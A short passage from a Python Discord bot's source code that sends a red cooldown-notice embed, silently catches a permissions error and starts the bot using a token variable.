        embed = discord.Embed(
            title=f" `Cooldown {remaining_time}`",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass


bot.run(TOKEN)
